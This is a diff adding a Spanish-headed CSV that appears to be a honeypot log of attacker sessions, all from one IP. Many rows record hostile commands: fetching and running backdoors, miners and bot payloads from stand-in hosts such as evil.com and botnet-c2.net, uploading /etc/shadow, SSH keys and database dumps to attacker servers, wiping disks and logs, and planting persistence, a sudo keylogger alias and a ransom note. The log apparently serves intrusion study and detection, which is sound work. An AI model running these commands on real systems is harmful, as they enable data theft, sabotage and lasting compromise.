@@ -1,0 +1,224 @@
+Session_ID,Timestamp,IP_Atacante,Secuencia_Comandos,Total_Comandos
+022d21cc59a4,2026-04-20T16:52:41.973106Z,88.13.24.103,ls -la -> whoami -> pwd -> cat /etc/passwd,4
+e068bba609f6,2026-04-20T17:09:22.528475Z,88.13.24.103,date -> find /var/www/ -name '*.env' -> cd .. -> cat /var/www/html/.env -> clear -> exit,6
+e180f37a82ff,2026-04-20T17:09:45.899787Z,88.13.24.103,cd ~ -> cd /tmp -> uptime -> wget http://malware-domain.com/xmrig.tar.gz -> tar  -zxvf  xmrig.tar.gz -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker ->  -> rm -rf xmrig* -> exit,10
+2dbb70910136,2026-04-20T17:11:43.802449Z,88.13.24.103,zip -r data.zip /var/lib/mysql -> wget --post-file=data.zip http://exfil-server.com/receive ->  -> rm  data.zip -> cd .. -> exit,6
+1db2ddc0d8a0,2026-04-20T17:12:33.626244Z,88.13.24.103,"mkdir  .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> ls -la -> chmod +x backdoor.elf -> uptime -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",10
+43db4c6f07fd,2026-04-20T17:17:33.899400Z,88.13.24.103,echo c > /proc/sysrq-trigger,1
+7b17af726e12,2026-04-20T17:17:36.889099Z,88.13.24.103,date -> ps aux -> netstat -tulnp -> ipconfig -> ip a -> ls -lah -> route -n -> arp  -a -> exit,9
+75f8bcde3b09,2026-04-20T17:22:05.707981Z,88.13.24.103,curl  -sL  http://pastebin.com/raw/xyz123  |  bash -> exit,2
+e342ba33a5d1,2026-04-20T17:22:16.912657Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
+dca183f1e66a,2026-04-20T17:23:47.226814Z,88.13.24.103,redis-cli  ping -> redis-cli config get dir -> exot,3
+a4bedfb5095b,2026-04-20T17:24:38.867232Z,88.13.24.103,uptime -> zip -r data.zip /var/lib/mysql -> wget --post-file=data.zip http://exfil-server.com/receive -> rm  data.zip -> exot -> exit,6
+f84cf0d32abf,2026-04-20T17:25:02.432225Z,88.13.24.103,cd /etc -> w -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> cd ~ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,7
+0ef32bc3d8df,2026-04-20T17:26:09.998011Z,88.13.24.103,echo '' -> uname -a -> echo '' -> whoami -> id -> cat /proc/cpuinfo -> cat  /etc/os-release -> free -m -> cd /tmp -> df -h -> exit,11
+d9a536120dca,2026-04-20T17:26:54.230449Z,88.13.24.103,cat /var/www/html/wp-config.php -> cd - -> grep -i 'password' /var/www/html/wp-config.php -> exot -> exit,5
+980e05e60e15,2026-04-20T17:27:11.100095Z,88.13.24.103,sudo -l -> find  /  -perm  -4000  -type  f  2>/dev/null ->  -> cat /etc/sudoers -> ls -> exit,6
+62308b11cbaf,2026-04-20T17:29:04.842213Z,88.13.24.103,cat  /var/www/html/wp-config.php -> grep  -i  'password'  /var/www/html/wp-config.php -> date -> exot -> exit,5
+c32cb0b8d82a,2026-04-20T17:31:21.293563Z,88.13.24.103,psql -U postgres -c '\l' -> exit,2
+ca07f2ef4623,2026-04-20T17:33:54.611688Z,88.13.24.103,uptime -> cat /etc/hostname -> cat /etc/hosts -> cat /etc/resolv.conf -> exit,5
+3afad5e8142f,2026-04-20T17:35:36.023583Z,88.13.24.103,dd  if=/dev/zero  of=/dev/sda  bs=1M  count=10 -> echo '' -> exit,3
+36f680e60e7c,2026-04-20T17:37:01.119686Z,88.13.24.103,echo '' -> find /var/www/ -name '*.env' -> ls -lah -> cat /var/www/html/.env ->  -> w -> exit,7
+73a751f47e11,2026-04-20T17:41:06.728005Z,88.13.24.103,cd /etc -> cd /tmp -> tar  -czvf  config_backup.tar.gz  passwd  shadow  ssh/ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
+a0d44c08d832,2026-04-20T17:42:44.160925Z,88.13.24.103,cd /tmp -> cd /etc -> ll -> tar  -czvf  config_backup.tar.gz  passwd  shadow  ssh/ ->  -> cd ~ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz,8
+cce168d107c6,2026-04-20T17:43:46.159487Z,88.13.24.103,"mkdir .hidden -> w -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",10
+06943993e4f3,2026-04-20T17:44:41.440330Z,88.13.24.103,env -> set -> echo $PATH -> cd /tmp -> history -> date -> cat ~/.bash_history -> exit,8
+e9ae2f7e010e,2026-04-20T17:45:44.340597Z,88.13.24.103,systemctl enable botnet.service -> systemctl  start  botnet -> exit,3
+5b0dd4c007da,2026-04-20T17:46:20.861792Z,88.13.24.103,cd .. -> sudo -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,5
+5680c59f5e0d,2026-04-20T17:52:13.937836Z,88.13.24.103,cd ~ -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> cd .. -> exit,5
+b5acbf6fa31d,2026-04-20T17:54:35.944212Z,88.13.24.103,enable -> system -> echo '' -> shell -> clear -> sh -> cat /proc/mounts -> w -> exit,9
+79141987f7c6,2026-04-20T17:55:04.153050Z,88.13.24.103,enable -> system -> echo '' -> shell -> ls -> sh -> cat /proc/mounts -> exot -> exit,9
+e4279e5c867b,2026-04-20T17:55:18.931724Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exit,2
+511c1174d06f,2026-04-20T17:55:58.672693Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> rm  mips.bot -> exit,6
+c1c248d9bbbc,2026-04-20T17:59:44.687959Z,88.13.24.103,echo c > /proc/sysrq-trigger ->  -> exit,3
+2dad2c935000,2026-04-20T18:01:31.931046Z,88.13.24.103,uname -r -> gcc  exploit.c  -o  exploit -> ./exploit -> whoami -> exit,5
+512ed9874f65,2026-04-20T18:02:16.959349Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> history -> crontab  -l -> exot,4
+aebb30dd5c8c,2026-04-20T18:03:07.376872Z,88.13.24.103,iptables -F -> iptables -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,5
+6dcd6acf15fa,2026-04-20T18:05:38.812935Z,88.13.24.103,clear -> cd /var/tmp -> curl  -O  http://botnet-c2.net/payload.sh -> bash payload.sh -> rm  payload.sh -> exit,6
+b48ff695bb28,2026-04-20T18:06:39.777627Z,88.13.24.103,date -> ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,4
+4ea6e486a59f,2026-04-20T18:07:39.431378Z,88.13.24.103,sudo -l ->  -> find / -perm -4000 -type f 2>/dev/null ->  -> cat /etc/sudoers -> exot,6
+5e4af62f2080,2026-04-20T18:07:51.278788Z,88.13.24.103,cd .. -> wget -q -O - http://185.112.x.x/installer.sh | bash -> exit,3
+e16b6803a9dc,2026-04-20T18:09:38.793390Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> uptime -> chmod 777 mips.bot -> ./mips.bot -> rm mips.bot -> exit,7
+9f74035b97b7,2026-04-20T18:11:38.187440Z,88.13.24.103,useradd -m -s /bin/bash sysadmin,1
+ff400a3c175c,2026-04-20T18:12:22.860310Z,88.13.24.103,docker run -v /:/mnt --rm -it alpine chroot /mnt sh -> cd ~ -> exit,3
+00514c0bdab9,2026-04-20T18:12:30.435405Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exit,3
+2695c6ef7f68,2026-04-20T18:13:15.611203Z,88.13.24.103,uname -a -> whoami ->  -> id -> uptime -> cat  /proc/cpuinfo -> ll -> cat /etc/os-release -> cd .. -> free -m -> df  -h -> ls -la -> exit,13
+8cdca52ac2d7,2026-04-20T18:16:51.478344Z,88.13.24.103,dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,2
+2263bb781a2e,2026-04-20T18:19:12.306648Z,88.13.24.103,ps aux -> kill -9 1234 ->  -> rm  -rf  /var/log/* -> cat /dev/null > ~/.bash_history -> ll -> history -c ->  -> cd .. -> exit,10
+6ca2d4697596,2026-04-20T18:24:09.196831Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",9
+e73cbcff6608,2026-04-20T18:25:40.129955Z,88.13.24.103,getcap  -r  /  2>/dev/null -> cd .. -> exit,3
+e9d93eb6897f,2026-04-20T18:26:23.608173Z,88.13.24.103,systemctl enable botnet.service ->  -> systemctl start botnet -> exit,4
+7b68a4676c36,2026-04-20T18:26:40.981485Z,88.13.24.103,uptime -> getcap  -r  /  2>/dev/null -> exit,3
+09b778f349d6,2026-04-20T18:28:52.749645Z,88.13.24.103,ls -lah -> useradd -m -s /bin/bash sysadmin,2
+2465d863ed71,2026-04-20T18:35:24.375769Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> ll -> exit,4
+8f3ddd333d2c,2026-04-20T18:36:41.537131Z,88.13.24.103,iptables -F -> w -> iptables -X -> iptables -P INPUT ACCEPT -> ls -la -> iptables -P OUTPUT ACCEPT -> w -> exit,8
+cc17a9ad5868,2026-04-20T18:38:49.220583Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
+fd7c76359a4b,2026-04-20T18:39:32.672720Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
+172d68606708,2026-04-20T18:39:47.559805Z,88.13.24.103,who -> ls -la /home -> cat /etc/passwd -> cd .. -> cat  /etc/shadow ->  -> cat /etc/group -> who -> exit,9
+a7dbfe77da3f,2026-04-20T18:41:53.716623Z,88.13.24.103,useradd -m -s /bin/bash sysadmin,1
+16d38523f73d,2026-04-20T18:42:03.881369Z,88.13.24.103,cd /tmp -> echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab -l -> exot -> exit,5
+c229ee597129,2026-04-20T18:45:47.957841Z,88.13.24.103,"nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",2
+3230997fb6ab,2026-04-20T18:46:52.551514Z,88.13.24.103,enable ->  -> ls -la -> system -> shell -> echo '' -> sh -> cat /proc/mounts -> exit,9
+85c437473742,2026-04-20T18:47:10.202780Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
+e3deae15c1e9,2026-04-20T18:47:51.617089Z,88.13.24.103,ps aux -> ls -la -> netstat -tulnp -> ifconfig -> ip a -> route -n -> arp -a -> exit,8
+89b3cdb600bc,2026-04-20T18:51:34.236587Z,88.13.24.103,find /home -type f -name '*.txt' -> w -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> ls -> exot,5
+8650b5ba9782,2026-04-20T18:51:48.781642Z,88.13.24.103,"mkdir .hidden -> ls -> cd .hidden -> cat /etc/issue -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ll -> ./backdoor.elf  & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",11
+292ece100191,2026-04-20T18:52:04.372739Z,88.13.24.103,"nmap  -sT  -p  22,80,443,3306  192.168.1.0/24 -> exit",2
+7a6f2bc8c6d2,2026-04-20T18:52:09.261260Z,88.13.24.103,enable -> system -> cd ~ -> shell -> sh -> cat /proc/mounts -> exit,7
+7d820a407a58,2026-04-20T18:53:55.106122Z,88.13.24.103,getcap -r / 2>/dev/null -> cd .. -> exit,3
+98516263e389,2026-04-20T18:54:10.617533Z,88.13.24.103,cd /tmp -> cd  /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> cd .. -> ./xmrig -o pool.com:3333 -u hacker -> rm  -rf  xmrig* -> exit,9
+a9d8bec23e32,2026-04-20T18:54:31.434157Z,88.13.24.103,cd /etc ->  -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
+138131b37a74,2026-04-20T18:55:49.462237Z,88.13.24.103,cd  /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> pwd -> bash payload.sh -> rm payload.sh -> exot,6
+08c3b8ef0ca2,2026-04-20T18:57:18.159466Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> uptime -> exit,4
+76113d1f9f49,2026-04-20T18:57:59.383825Z,88.13.24.103,sudo -l -> pwd -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,5
+0237a7dd937d,2026-04-20T18:58:53.475373Z,88.13.24.103,psql -U postgres -c '\l' -> exit,2
+f31a0274e303,2026-04-20T18:59:22.943734Z,88.13.24.103,w -> getcap  -r  /  2>/dev/null -> w -> exit,4
+d23386e4652c,2026-04-20T19:02:13.065095Z,88.13.24.103,enable -> pwd -> system -> shell -> sh -> w -> cat /proc/mounts -> exit,8
+69faef73ba96,2026-04-20T19:03:51.047390Z,88.13.24.103,ll -> cat /etc/rc.local -> echo  '/tmp/miner  &'  >>  /etc/rc.local -> exit,4
+f7dc72e5ab51,2026-04-20T19:04:30.443380Z,88.13.24.103,ls -> uname -r -> cd .. -> gcc exploit.c -o exploit -> ./exploit -> whoami -> exot,7
+6ffcb392c4a1,2026-04-20T19:05:27.521107Z,88.13.24.103,cat /etc/issue -> cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> bash payload.sh -> rm payload.sh -> exit,6
+e549245498e4,2026-04-20T19:06:13.365236Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> ./exploit -> whoami -> cd ~ -> exit,6
+8a04f5a3ee9e,2026-04-20T19:08:10.430311Z,88.13.24.103,cd /var/tmp -> curl  -O  http://botnet-c2.net/payload.sh -> bash payload.sh -> rm  payload.sh -> exit,5
+7e2a015d937d,2026-04-20T19:09:17.435287Z,88.13.24.103,"cat /etc/issue -> echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",4
+26d45c88784d,2026-04-20T19:11:09.577974Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
+503d3c09fb72,2026-04-20T19:12:34.468762Z,88.13.24.103,"mkdir  .hidden -> cd .hidden ->  -> history -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf  & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",11
+64fc9ef66bc5,2026-04-20T19:13:27.663484Z,88.13.24.103,who -> uname -a -> ll -> whoami -> history -> id -> cat /proc/cpuinfo -> cat /etc/os-release -> free -m -> df -h -> ls -la -> exit,12
+e96abefd76d8,2026-04-20T19:14:28.482002Z,88.13.24.103,cat /var/www/html/wp-config.php -> echo '' -> grep -i 'password' /var/www/html/wp-config.php -> exit,4
+2e56abf38f43,2026-04-20T19:14:39.829000Z,88.13.24.103,uname -a -> cat /etc/issue -> whoami -> id -> ls -> cat  /proc/cpuinfo -> w -> cat /etc/os-release -> free -m -> df  -h -> exit,11
+ef29cbe3a150,2026-04-20T19:16:52.131321Z,88.13.24.103,systemctl enable botnet.service ->  -> systemctl start botnet -> cat /etc/issue -> exit,5
+addf994bdc14,2026-04-20T19:17:26.862980Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> cat /etc/issue -> ./exploit -> whoami -> exit,6
+cd2c09514ee3,2026-04-20T19:17:53.276911Z,88.13.24.103,who -> cat  /etc/rc.local -> ls -> echo  '/tmp/miner  &'  >>  /etc/rc.local -> exit,5
+04b6106c7004,2026-04-20T19:18:18.520127Z,88.13.24.103,ls -la -> echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> who -> exit,5
+1d8d2a1c283c,2026-04-20T19:19:37.467045Z,88.13.24.103,iptables -F -> who -> iptables -X ->  -> iptables -P INPUT ACCEPT -> pwd -> iptables -P OUTPUT ACCEPT -> ls -lah -> exit,9
+a657499cfb12,2026-04-20T19:21:02.486814Z,88.13.24.103,ls -la /home -> cat  /etc/passwd -> cat /etc/shadow -> cd - -> cat /etc/group -> date -> exit,7
+923fa4162b4b,2026-04-20T19:21:26.552055Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
+272f5366b22b,2026-04-20T19:21:42.795496Z,88.13.24.103,cd /etc -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> cd /tmp -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
+f7c2bb10e0cf,2026-04-20T19:22:47.475722Z,88.13.24.103,who -> redis-cli ping -> redis-cli config get dir -> exit,4
+e12d4cac0069,2026-04-20T19:23:18.340569Z,88.13.24.103,echo '' -> wget -q -O - http://185.112.x.x/installer.sh | bash -> pwd -> exit,4
+406e0c3b7526,2026-04-20T19:23:56.572714Z,88.13.24.103,cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> date -> bash payload.sh -> rm payload.sh -> exit,6
+d21e6604b0af,2026-04-20T19:25:09.223550Z,88.13.24.103,echo '' -> echo c > /proc/sysrq-trigger,2
+e67a94d36deb,2026-04-20T19:25:50.970061Z,88.13.24.103,history -> ps  aux -> kill  -9  1234 -> rm  -rf  /var/log/* -> who -> cat /dev/null > ~/.bash_history -> history -c -> exit,8
+4cd28d9b80b8,2026-04-20T19:26:17.412627Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab ->  -> crontab -l ->  -> exit,5
+a178854a4863,2026-04-20T19:27:38.696917Z,88.13.24.103,cd /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz ->  -> uptime -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> who -> rm -rf xmrig* -> exit,10
+1e981f31770e,2026-04-20T19:28:28.615575Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source  ~/.bashrc -> uptime -> exit",4
+92828d057025,2026-04-20T19:28:53.580653Z,88.13.24.103,"clear -> nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",3
+0bfd9b18ffed,2026-04-20T19:31:20.003812Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget  http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",8
+683cc3395d2a,2026-04-20T19:33:00.712459Z,88.13.24.103,cd /tmp -> cd .. -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> rm -rf xmrig* -> exit,8
+844afd695e58,2026-04-20T19:34:44.928811Z,88.13.24.103,docker run -v /:/mnt --rm -it alpine chroot /mnt sh -> exit,2
+bf24c7bc6df2,2026-04-20T19:34:54.208910Z,88.13.24.103,cd ~ -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> exit,4
+1609165e0f4f,2026-04-20T19:35:18.068383Z,88.13.24.103,w -> uname -r -> gcc exploit.c -o exploit -> cd ~ -> ./exploit -> whoami -> who -> exit,8
+0466033daf83,2026-04-20T19:37:58.299120Z,88.13.24.103,wget -q -O - http://185.112.x.x/installer.sh | bash -> date -> exit,3
+ae6ad42c4c0c,2026-04-20T19:38:13.719035Z,88.13.24.103,pwd -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> ls -lah -> exit,5
+3428ebec7c33,2026-04-20T19:41:01.046559Z,88.13.24.103,cat /etc/issue -> ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,4
+a0a3da15792b,2026-04-20T19:41:58.629760Z,88.13.24.103,enable -> ll -> system -> shell -> sh -> uptime -> cat /proc/mounts ->  -> exit,9
+0898a5eea2c9,2026-04-20T19:43:39.330057Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> cat /etc/issue -> exit,4
+ecd58aea37f7,2026-04-20T19:46:52.416942Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf ->  -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",10
+64a64b5595d2,2026-04-20T19:48:26.552994Z,88.13.24.103,cd /tmp -> systemctl enable botnet.service -> systemctl start botnet -> exit,4
+e4bd1c58e24d,2026-04-20T19:49:48.374099Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
+553f504c353f,2026-04-20T19:51:06.747446Z,88.13.24.103,cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> history -> exit,4
+f0c568998eb3,2026-04-20T19:51:45.488386Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exot,3
+915c39bd1e9e,2026-04-20T19:54:46.828399Z,88.13.24.103,cat /etc/issue -> cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> ls -lah -> exit,5
+8d497e43faae,2026-04-20T19:56:11.154972Z,88.13.24.103,find /var/www/ -name '*.env' -> ls -> cat  /var/www/html/.env -> exit,4
+2e6590893740,2026-04-20T19:58:13.636416Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exot -> exit,3
+e1a366b30c47,2026-04-20T19:58:25.992922Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
+581cfc7637aa,2026-04-20T19:59:43.238521Z,88.13.24.103,cd /tmp -> cd - -> wget http://malware-domain.com/xmrig.tar.gz -> tar  -zxvf  xmrig.tar.gz -> chmod +x xmrig -> date -> ./xmrig -o pool.com:3333 -u hacker -> ls -lah -> rm -rf xmrig*,9
+7d50cde8359a,2026-04-20T20:00:43.328996Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp  dump.sql  hacker@evil.com:/tmp/,2
+7560ea01a718,2026-04-20T20:00:58.709717Z,88.13.24.103,history -> find /var/www/ -name '*.env' -> cat  /var/www/html/.env -> ls -lah -> exit,5
+b2bff629ca82,2026-04-20T20:01:18.076513Z,88.13.24.103,cat /etc/hostname -> cd - -> cat /etc/hosts -> cat /etc/resolv.conf -> uptime -> exit,6
+90f78c736901,2026-04-20T20:04:10.320634Z,88.13.24.103,env -> set -> date -> echo $PATH -> history -> cat ~/.bash_history -> echo '' -> exit,8
+e5fa33fe0b61,2026-04-20T20:04:24.672827Z,88.13.24.103,w -> iptables -F -> iptables -X ->  -> iptables -P INPUT ACCEPT -> iptables  -P  OUTPUT  ACCEPT -> w -> exot -> exit,9
+3cdd1c9cd82d,2026-04-20T20:05:23.193735Z,88.13.24.103,find  /  -name  '*.pem'  -o  -name  '*.key'  -o  -name  '*.ovpn'  2>/dev/null -> cat /home/user/aws.pem -> exit,3
+f08d550a11bf,2026-04-20T20:06:24.174579Z,88.13.24.103,ll -> cat  /var/log/auth.log  |  grep  Failed ->  -> ls -> cat /var/log/syslog -> exot -> exit,7
+53987744b371,2026-04-20T20:09:17.705746Z,88.13.24.103,ls -lah -> cd /tmp ->  -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> uptime -> ./xmrig -o pool.com:3333 -u hacker -> rm -rf xmrig* -> exit,10
+2312b768bc34,2026-04-20T20:10:07.058118Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
+825919a0b1cf,2026-04-20T20:10:41.749451Z,88.13.24.103,ls -la /home -> cat  /etc/passwd -> cat /etc/shadow -> cat /etc/group ->  -> exit,6
+41a38fb9b5cf,2026-04-20T20:11:25.365134Z,88.13.24.103,mysqldump  -u  root  -p123456  db_name  >  dump.sql ->  -> cd ~ -> scp dump.sql hacker@evil.com:/tmp/,4
+1a5aaa05c500,2026-04-20T20:13:09.844237Z,88.13.24.103,ls -> cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> pwd -> rm mips.bot -> exit,8
+08b1ab93a5c6,2026-04-20T20:14:56.835684Z,88.13.24.103,cd .. -> chattr -i /etc/passwd -> ls -lah -> rm  -f  /etc/passwd -> who -> exit,6
+0e9042d3c911,2026-04-20T20:15:53.989711Z,88.13.24.103,find / -name '*.pem' -o -name '*.key' -o -name '*.ovpn' 2>/dev/null -> cat  /home/user/aws.pem -> exit,3
